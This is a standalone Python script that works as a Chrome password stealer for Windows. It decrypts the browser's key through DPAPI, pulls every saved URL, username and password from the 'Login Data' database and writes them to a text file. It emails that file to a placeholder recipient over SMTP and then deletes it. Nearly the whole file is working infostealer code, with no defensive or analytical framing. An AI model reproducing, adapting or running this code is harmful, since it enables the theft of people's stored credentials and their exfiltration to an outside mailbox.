import os
import sqlite3
import shutil
import json
import base64
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders
from datetime import datetime, timedelta
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import win32crypt

def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome", 
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as file:
        local_state = file.read()
        local_state = json.loads(local_state)
    
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]  # Remove DPAPI prefix
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = Cipher(algorithms.AES(key), modes.GCM(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        return decryptor.update(password) + decryptor.finalize()
    except Exception as e:
        return f"Error: {str(e)}"

def write_passwords_to_file(filename, passwords):
    with open(filename, "w", encoding="utf-8") as file:
        for url, username, password in passwords:
            file.write(f"URL: {url}\nUsername: {username}\nPassword: {password}\n\n")

def send_email_with_attachment(smtp_server, port, login, password, subject, body, from_addr, to_addr, file_to_attach):
    msg = MIMEMultipart()
    msg['From'] = from_addr
    msg['To'] = to_addr
    msg['Subject'] = subject

    msg.attach(MIMEText(body, 'plain'))

    attachment = MIMEBase('application', 'octet-stream')
    with open(file_to_attach, "rb") as file:
        attachment.set_payload(file.read())
    encoders.encode_base64(attachment)
    attachment.add_header('Content-Disposition', f'attachment; filename={os.path.basename(file_to_attach)}')

    msg.attach(attachment)

    with smtplib.SMTP(smtp_server, port) as server:
        server.starttls()
        server.login(login, password)
        server.sendmail(from_addr, to_addr, msg.as_string())

def main():
    key = get_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                           "Google", "Chrome", "User Data", "default", "Login Data")
    filename = "Login Data.db"
    output_file = "passwords.txt"
    shutil.copyfile(db_path, filename)
    
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    
    passwords = []
    for row in cursor.fetchall():
        url = row[0]
        username = row[1]
        encrypted_password = row[2]
        decrypted_password = decrypt_password(encrypted_password, key).decode()
        passwords.append((url, username, decrypted_password))
    
    cursor.close()
    db.close()
    os.remove(filename)

    write_passwords_to_file(output_file, passwords)

    # Настройки для отправки почты
    smtp_server = "smtp.yourmailserver.com"
    port = 587
    login = "youremail@example.com"
    password = "yourpassword"
    from_addr = "youremail@example.com"
    to_addr = "recipient@example.com"
    subject = "Extracted Passwords"
    body = "Please find the attached file containing the extracted passwords."

    send_email_with_attachment(smtp_server, port, login, password, subject, body, from_addr, to_addr, output_file)

    os.remove(output_file)

if __name__ == "__main__":
    main()
